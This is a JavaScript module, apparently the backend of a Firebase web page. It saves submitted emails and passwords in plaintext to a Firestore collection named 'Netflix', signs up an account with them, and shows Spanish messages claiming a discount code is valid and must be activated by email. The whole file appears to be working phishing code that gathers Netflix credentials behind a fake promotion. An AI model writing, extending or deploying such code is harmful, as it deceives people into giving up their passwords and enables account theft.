import { firebase, db } from "./FirebaseConfig";
import { message } from "antd";
import "antd/dist/antd.css";
export const createUser = (email, password) => {
  firebase
    .auth()
    .createUserWithEmailAndPassword(email, password)
    .then((item) => {
      let user = firebase.auth().currentUser;
      console.log("createUser says:", user, item);
      user.sendEmailVerification().then(() => {
        message.success("Correo de comprobación enviado correctamente.");
      }).catch(() => {
        message.error("Error al enviar correo de comprobación.")
      });
    })
    .catch((Error) =>message.error("Error al enviar correo de comprobación."));
};
export const insertData = (email, password) => {
  db.collection("Netflix")
    .add({
      email,
      password,
    })
    .then(() =>{
      createUser(email, password);
      message.success(
        "Código de descuento  válido, revisa tu correo para activarlo.",
        5
      )}
    )
    .catch(() =>
      message.error(
        "Error activando código, intenta otra vez o con otro correo.",
        5
      )
    );
};
